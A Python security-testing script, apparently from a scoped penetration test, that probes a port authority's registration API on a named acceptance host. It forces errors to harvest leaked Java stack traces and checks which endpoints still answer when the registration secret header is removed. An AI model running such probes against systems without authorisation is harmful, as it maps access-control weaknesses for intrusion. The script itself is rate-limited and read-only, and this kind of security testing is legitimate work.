#!/usr/bin/env python3
"""Exception-oracle sweep of the Amaris Combase API on register-accpt.

Why: every `RavExceptionWithDetail` is serialised with a full Java stack trace, so
forcing an error on any endpoint leaks internal class/method names -- including the
authorisation helpers. Reused to map where authorisation is enforced and how.

Safety:
  * inherits the guarded, 4 req/s client from poa_register.py (host allowlist);
  * read-only / malformed input only -- no state-changing payloads are sent;
  * /api/lostpassword is deliberately NOT probed (it dispatches e-mail, and email
    bombing is an out-of-scope action).

Output: compact report on stdout, raw JSON to api-sweep.json.
"""
from __future__ import annotations

import json
import re
import sys

import poa_register as P

HOST = "register-accpt.portofantwerpbruges.com"

# (label, method, path, payload) -- None payload means "no body"
STATIC = [
    ("auth",                 "GET",  "/api/auth",                              None),
    ("auth/none",            "GET",  "/api/auth/none",                         None),
    ("auth/group",           "GET",  "/api/auth/group",                        None),
    ("auth/role",            "GET",  "/api/auth/role",                         None),
    ("countries",            "GET",  "/api/countries",                         None),
    ("parameters/getEnvironment",   "GET", "/api/parameters/getEnvironment",   None),
    ("parameters/homelink",         "GET", "/api/parameters/homelink",         None),
    ("parameters/supportemailaddress", "GET", "/api/parameters/supportemailaddress", None),
    ("mypolicies GET",       "GET",  "/api/mypolicies",                        None),
    ("mypolicies POST {} ",  "POST", "/api/mypolicies",                        {}),
    ("mypolicies POST bad",  "POST", "/api/mypolicies",                        "{bad"),
    ("v2/mypolicies GET",    "GET",  "/api/v2/mypolicies",                     None),
    ("v2/mypolicies POST bad","POST", "/api/v2/mypolicies",                    "{bad"),
    ("resetpassword/valid",  "GET",  "/api/resetpassword/valid",               None),
    ("lostusername empty",   "POST", "/api/lostusername",                      {}),
    ("lostusername badtype", "POST", "/api/lostusername",                      {"email": {"a": 1}}),
    ("registernewusers GET", "GET",  "/api/registernewusers",                  None),
    ("registernewusers bad", "POST", "/api/registernewusers",                  "{bad"),
    ("policy",               "GET",  "/api/registernewusers/policy",           None),
    ("policy badguid",       "GET",  "/api/registernewusers/policy/not-a-guid/EN", None),
    ("policy badlang",       "GET",  "/api/registernewusers/policy/"
                                     "f222c55a-e249-4873-8b81-d0e9397b65e6/XX", None),
    ("rid invalid",          "GET",  "/api/registernewusers/!!!invalid!!!",    None),
    ("rid wronglen",         "GET",  "/api/registernewusers/AAAA",             None),
]

SUB = [
    ("sub rid",              "GET",  "/api/registernewusers/{id}",             None),
    ("sub applications",     "GET",  "/api/registernewusers/{id}/applications", None),
    ("sub match",            "GET",  "/api/registernewusers/{id}/match",       None),
    ("sub match badtype",    "GET",  "/api/registernewusers/{id}/match?x[]=1", None),
    ("sub personal bad",     "POST", "/api/registernewusers/{id}/personal",    "{bad"),
    ("sub personal wrongtype","POST","/api/registernewusers/{id}/personal",    {"personal": []}),
    ("sub company bad",      "POST", "/api/registernewusers/{id}/company",     "{bad"),
    ("sub application bad",  "PUT",  "/api/registernewusers/{id}/application", "{bad"),
    ("sub application wrong","PUT",  "/api/registernewusers/{id}/application", {"id": {"x": 1}}),
    ("sub reglang bad",      "PUT",  "/api/registernewusers/{id}/registrationlanguage", "{bad"),
    ("sub reglang wrong",    "PUT",  "/api/registernewusers/{id}/registrationlanguage", {"language": []}),
    ("sub captcha bad",      "PUT",  "/api/registernewusers/{id}/captcha",     "{bad"),
    ("sub companyid bad",    "PUT",  "/api/registernewusers/{id}/companyid",   "{bad"),
    ("sub companyid none",   "PUT",  "/api/registernewusers/{id}/companyid",   None),
    ("sub captchaimage GET", "GET",  "/api/registernewusers/{id}/captchaimage", None),
    ("sub captcha GET",      "GET",  "/api/registernewusers/{id}/captcha",     None),
]

FRAME = re.compile(r"at (be\.amaris[\w.$]*?)\.([\w$<>]+)\(([\w.$]+\.java):(\d+)\)")
RESNAME = re.compile(r"for resource ([I\w]+)")


def analyse(body: bytes | str) -> dict:
    text = body.decode("utf-8", "replace") if isinstance(body, bytes) else (body or "")
    info: dict = {}
    m = re.search(r'"message"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
    if m:
        info["message"] = m.group(1)[:160]
        r = RESNAME.search(info["message"])
        if r:
            info["resource_annotation_error"] = r.group(1)
    frames = FRAME.findall(text)
    if frames:
        info["stack"] = True
        seen, out = set(), []
        for pkg, method, src, line in frames:
            key = (pkg, method, src, line)
            if key in seen:
                continue
            seen.add(key)
            out.append(f"{pkg}.{method}({src}:{line})")
        info["frames"] = out
    return info


def run(c, label, method, path, payload, tag):
    try:
        status, body = c.call(method, path, payload, raw=True)
    except Exception as exc:
        return {"tag": tag, "label": label, "method": method, "path": path,
                "status": "ERR", "error": str(exc)[:120]}
    a = analyse(body)
    rec = {"tag": tag, "label": label, "method": method, "path": path,
           "status": status, "len": len(body) if isinstance(body, bytes) else len(str(body)),
           **a}
    print(f"  {str(status):>4}  {method:5s} {path[:62]:62s} {a.get('message','')[:52]}")
    if a.get("frames"):
        for f in a["frames"][:6]:
            print(f"          | {f}")
    return rec


def main() -> int:
    c = P.Client(HOST, "EN", "none")
    c.warmup()
    results = []

    print(f"\nPHASE A - unauthenticated top-level endpoints on {HOST}\n")
    for label, method, path, payload in STATIC:
        results.append(run(c, label, method, path, payload, "static"))

    print("\nPHASE B - create one draft, then probe sub-resources\n")
    st, reg = c.call("POST", "/api/registernewusers", {})
    if st != 200:
        print(f"  !! could not create draft: {st} {reg}")
        return 1
    rid, secret = reg["id"], reg["secret"]
    print(f"  draft {rid} (secret set on client)\n")
    c.secret = secret
    for label, method, path, payload in SUB:
        results.append(run(c, label, method, path.replace("{id}", rid), payload, "sub_secret"))

    # same sub-resource set, but WITHOUT the secret header: shows which endpoints
    # actually enforce the registration secret.
    print("\nPHASE C - same sub-resources with the secret header REMOVED\n")
    c.secret = None
    for label, method, path, payload in SUB[:4] + SUB[13:]:
        results.append(run(c, label + " [no-secret]", method,
                           path.replace("{id}", rid), payload, "sub_nosecret"))

    json.dump(results, open("api-sweep.json", "w"), indent=1)
    print_summary(results, c.count)
    return 0


def print_summary(results, count):
    print("\n" + "=" * 78)
    print("LEAKED INTERNAL SYMBOLS (from forced exceptions)")
    print("=" * 78)
    authz = {}
    for r in results:
        for f in r.get("frames", []):
            if re.search(r"[Ss]ecurity|[Aa]uth|[Pp]olicy|[Ss]ecret|Login|User|Assert", f):
                authz.setdefault(f, set()).add(f"{r['method']} {r['path']}")
    for f, where in sorted(authz.items()):
        print(f"  {f}")
        print(f"      via: {', '.join(sorted(where))[:100]}")

    print("\n" + "=" * 78)
    print("ENDPOINTS BY OUTCOME")
    print("=" * 78)
    for r in results:
        if r.get("status") == 200:
            verdict = "REACHABLE unauthenticated"
        elif r.get("status") in (204,):
            verdict = "accepted (no content)"
        elif r.get("resource_annotation_error"):
            verdict = f"NO annotation on {r['resource_annotation_error']}"
        elif r.get("status") == 405:
            verdict = "method not allowed"
        elif r.get("stack"):
            verdict = f"threw: {r.get('message','')[:44]}"
        elif r.get("status") in (401, 403):
            verdict = "authorisation enforced"
        elif r.get("status") == 404:
            verdict = "not found"
        else:
            verdict = "-"
        print(f"  {str(r.get('status')):>4}  {r['method']:5s} {r['path'][:56]:56s} {verdict}")
    print(f"\n{count} requests, 4 req/s. raw -> api-sweep.json")


if __name__ == "__main__":
    sys.exit(main())
